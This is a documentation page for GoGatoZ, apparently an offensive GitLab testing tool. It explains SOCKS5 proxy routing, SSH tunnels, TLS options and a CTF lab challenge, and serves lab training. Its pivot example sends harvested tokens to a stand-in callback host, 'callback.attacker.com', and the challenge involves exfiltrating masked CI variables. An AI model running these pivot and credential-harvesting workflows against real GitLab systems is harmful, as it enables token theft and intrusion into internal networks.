---
title: Networking & Proxy
description: Route GoGatoZ traffic through a SOCKS5 proxy to reach internal GitLab instances behind firewalls, jump hosts, or VPNs.
---

GoGatoZ supports routing all GitLab API traffic through a SOCKS5 proxy. This is useful when the target GitLab instance is on an internal network accessible only through a jump host, SSH tunnel, or corporate proxy.

## SOCKS5 Proxy Flags

| Flag | Env Variable | Description |
|------|-------------|-------------|
| `--socks5-proxy` | `GOGATOZ_SOCKS5_PROXY` | SOCKS5 proxy address (`host:port`) |
| `--socks5-user` | `GOGATOZ_SOCKS5_USER` | Proxy username (optional) |
| `--socks5-pass` | `GOGATOZ_SOCKS5_PASS` | Proxy password (optional) |

These are global flags available on all commands: `search`, `enumerate`, `attack`, `pivot`, `secretscan`, and `mcp`.

## Basic Usage

```bash
# Route through a local SOCKS5 proxy
gogatoz enumerate \
  --socks5-proxy 127.0.0.1:1080 \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --input targets.txt

# With authentication
gogatoz search \
  --socks5-proxy proxy.corp:9050 \
  --socks5-user operator \
  --socks5-pass s3cret \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --query "deploy"
```

## SSH Tunnel (Most Common)

The most common use case is an SSH dynamic port forward (SOCKS5 tunnel) through a jump host that has access to the internal GitLab instance.

```bash
# Step 1: Open an SSH SOCKS5 tunnel to the jump host
ssh -D 1080 -N -f jumphost.example.com

# Step 2: Run GoGatoZ through the tunnel
gogatoz enumerate \
  --socks5-proxy 127.0.0.1:1080 \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --input targets.txt
```

The `-D 1080` flag tells SSH to listen on local port 1080 as a SOCKS5 proxy. All GoGatoZ traffic is then forwarded through the jump host to the internal GitLab instance.

## Environment Variables

For repeated use, set the proxy via environment variables instead of flags:

```bash
export GOGATOZ_SOCKS5_PROXY=127.0.0.1:1080
export GOGATOZ_SOCKS5_USER=operator    # optional
export GOGATOZ_SOCKS5_PASS=s3cret      # optional

# Now all commands route through the proxy automatically
gogatoz search --gitlab-url https://gitlab.internal.corp --token glpat-xxx --query "deploy"
gogatoz enumerate --gitlab-url https://gitlab.internal.corp --token glpat-xxx --input targets.txt
```

These can also be set in a `.gogatoz.yaml` config file:

```yaml
socks5-proxy: "127.0.0.1:1080"
socks5-user: "operator"
socks5-pass: "s3cret"
```

## Pivot Through a Proxy

The `pivot` command creates per-token clients as it discovers new credentials. All of these clients inherit the SOCKS5 proxy configuration automatically:

```bash
gogatoz pivot \
  --socks5-proxy 127.0.0.1:1080 \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --target root/app \
  --external-url https://callback.attacker.com:9443
```

:::note
The SOCKS5 proxy routes outbound GitLab API calls only. The pivot callback server (`--listen`) binds locally and is not affected by the proxy.
:::

## Composing with TLS Options

SOCKS5 proxy composes with all existing TLS options:

```bash
# SOCKS5 + skip TLS verification (self-signed certs)
gogatoz enumerate \
  --socks5-proxy 127.0.0.1:1080 \
  --insecure-skip-tls-verify \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --input targets.txt

# SOCKS5 + custom CA certificate
gogatoz enumerate \
  --socks5-proxy 127.0.0.1:1080 \
  --ca-cert /path/to/internal-ca.pem \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --input targets.txt
```

## How It Works

When `--socks5-proxy` is set, GoGatoZ creates a SOCKS5 dialer using `golang.org/x/net/proxy` and replaces the default TCP dialer on the HTTP transport. This means:

- All TCP connections (including TLS handshakes) are tunneled through the SOCKS5 proxy
- The `HTTP_PROXY`/`HTTPS_PROXY` environment variables are ignored when SOCKS5 is active
- Hostnames are sent to the SOCKS5 proxy for resolution (SOCKS5 DOMAINNAME address type), so Docker DNS names like `gitlab-internal` work when the proxy is on the target network
- Rate limiting, retry logic, and connection pooling all work normally through the proxy

## Troubleshooting

**Connection refused**: Verify the SOCKS5 proxy is running and the address/port are correct.

```bash
# Test SOCKS5 connectivity
curl --socks5-hostname 127.0.0.1:1080 https://gitlab.internal.corp/api/v4/version
```

**Authentication failed**: Check `--socks5-user` and `--socks5-pass` values. Some proxies require auth even for local connections.

**Timeouts**: The proxy adds latency. Consider increasing timeouts:

```bash
gogatoz enumerate \
  --socks5-proxy 127.0.0.1:1080 \
  --http-req-timeout 60s \
  --gitlab-url https://gitlab.internal.corp \
  --token glpat-xxx \
  --input targets.txt
```

## Lab Exercise: Proxy Recon Challenge

The GoGatoZ CTF lab includes a network-isolated GitLab instance (`gitlab-internal`) only reachable through a SOCKS5 proxy. This exercises real-world network-segmented enumeration.

### Lab Architecture

```
Default Network (lab_default)
  gitlab (8929), runners, postgres, flagserver
  socks5-noauth (1080) ──┐  dual-homed
  socks5-auth (1081) ────┤  dual-homed
                         │
Isolated Network (lab_isolated, no internet)
  gitlab-internal (8929, no host port)
  runner-isolated-shell
  socks5-noauth, socks5-auth
```

- **Port 1080** — Open SOCKS5 proxy (no auth, for testing)
- **Port 1081** — Authenticated SOCKS5 proxy (CTF challenge)

### Quick Verification

Test that the proxy works with the open (no-auth) proxy:

```bash
# Via curl
curl --socks5-hostname localhost:1080 http://gitlab-internal:8929/api/v4/version

# Via GoGatoZ (using the lab root PAT)
gogatoz search \
  --socks5-proxy localhost:1080 \
  --gitlab-url http://gitlab-internal:8929 \
  --token glpat-internal-admin-token-9 \
  --query classified
```

### CTF Challenge (Flag 14 - 500 pts)

1. Discover that an internal GitLab exists by examining CI variables on the main GitLab
2. Find the SOCKS5 proxy credentials (masked CI variables require exfiltration)
3. Enumerate the internal GitLab through the authenticated proxy
4. Extract Flag 14 from a vulnerable project on the internal instance

:::tip[Hint]
The `infra-automation` project on the main GitLab references internal scanning infrastructure. You will need the root PAT (Flag 5) to access it.
:::
